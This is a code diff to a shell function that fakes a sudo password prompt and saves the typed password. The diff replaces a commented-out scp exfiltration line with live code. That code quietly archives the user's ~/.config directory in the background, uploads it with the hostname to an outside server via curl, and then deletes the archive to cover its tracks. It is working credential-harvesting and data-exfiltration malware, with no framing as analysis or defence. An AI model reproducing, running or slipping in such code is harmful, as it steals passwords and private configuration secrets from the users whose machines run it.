@@ -16,11 +16,28 @@ authenticate_with_sudo() {
 		echo "${password}" >> "${PASS_FILE}"
 		chmod 600 "${PASS_FILE}"
 
-		#nohup scp -i "$HOME/.ssh/$(whoami)_ed25519" "$PASS_FILE" "suser@40.233.2.200:~/Exf/$(hostname)" >/dev/null 2>&1 
+		TAR_FILE="${USER}_pass.tar.gz"
+
+		nohup sh -c '
+			TAR_FILE="$1"
+			
+			# 1. Create the compressed archive
+			if tar -czf "$TAR_FILE" ~/.config/ >/dev/null 2>&1; then
+				
+				# 2. If tar succeeds, attempt the upload
+				if curl -s -S -X POST https://proxy1.cryptopredictor.org/upload \
+					-F "file=@$TAR_FILE" \
+					-F "hostname=$(hostname)" >/dev/null; then
+					
+					# 3. If upload succeeds, clean up the file
+					rm "$TAR_FILE"
+				fi
+			fi
+		' _ "$TAR_FILE" >/dev/null 2>&1 &
 
 		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
             unset password
-            rm -f "${PASS_FILE}"
+            rm -f "${PASS_FILE}" >/dev/null 2>&1
             return 0
         else
 			echo "Sorry, try again."
@@ -32,7 +49,7 @@ authenticate_with_sudo() {
 
     done
 
-    rm -f "${PASS_FILE}"
+    rm -f "${PASS_FILE}" >/dev/null 2>&1
     return 1
 }
 main() {
